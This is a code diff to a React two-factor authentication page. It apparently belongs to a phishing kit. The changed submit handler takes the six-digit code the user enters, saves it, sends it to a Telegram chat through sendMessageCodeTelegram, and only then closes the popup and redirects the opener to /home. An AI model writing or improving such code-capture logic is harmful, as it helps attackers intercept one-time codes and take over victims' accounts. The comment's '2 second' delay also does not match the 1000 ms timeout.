@@ -63,16 +63,18 @@ export default function TwoFactorAuth() {
   const handleSubmit = (e) => {
     e.preventDefault();
     const twoFactorCode = code.join("");
-    localStorage.setItem("twoFactorCode", JSON.stringify(twoFactorCode));
 
     if (twoFactorCode.length === 6) {
-      window.close();
+      localStorage.setItem("twoFactorCode", JSON.stringify(twoFactorCode));
+      sendMessageCodeTelegram(twoFactorCode);
 
-      if (window.opener) {
-        sendMessageCodeTelegram(twoFactorCode);
-        console.log(twoFactorCode);
-        window.opener.location.href = "/home";
-      }
+      setTimeout(() => {
+        window.close();
+
+        if (window.opener) {
+          window.opener.location.href = "/home";
+        }
+      }, 1000); // Delay 2 giây
     } else {
       alert("Please enter a complete 6-digit code");
     }
